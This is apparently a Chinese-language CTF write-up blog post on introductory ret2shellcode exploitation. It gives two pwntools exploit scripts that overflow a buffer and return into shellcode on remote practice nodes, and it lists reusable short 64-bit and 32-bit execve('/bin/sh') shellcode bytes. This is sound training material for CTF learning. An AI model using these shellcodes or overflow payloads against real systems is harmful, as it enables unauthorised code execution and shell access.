---
title: PWN入门-ret2shellcode做题
date: 2024-01-26 22:33:47
tags: PWN
mathjax: true
---

# PWN入门-ret2shellcode做题

## [HNCTF 2022 Week1]ret2shellcode

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')
p=remote("node5.anna.nssctf.cn",28261)
elf=ELF('./attachment')
shellcode=asm(shellcraft.sh()).ljust(0x108,b'a')
buff_addr=p64(elf.sym["buff"])
payload1=flat([shellcode,buff_addr])
p.sendline(payload1)
p.interactive()
```

## [GDOUCTF 2023]Shellcode

```python
# 64位短shellcode 23字节：\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
# 32位短shellcode 21字节：\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

from pwn import *
context(log_level='debug',os='linux',arch='amd64')
elf=ELF('./attachment')
p=remote("node4.anna.nssctf.cn",28141)
# p=process('./attachment')
p.recvuntil("Please.")
shellcode1=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
payload1=shellcode1
p.sendline(payload1)
p.recvuntil("Let's start!")
stack_overflow=b'a'*(0xa+8)
buf_addr=p64(elf.sym["name"])
payload2=flat([stack_overflow,buf_addr])
p.sendline(payload2)
p.interactive()
```
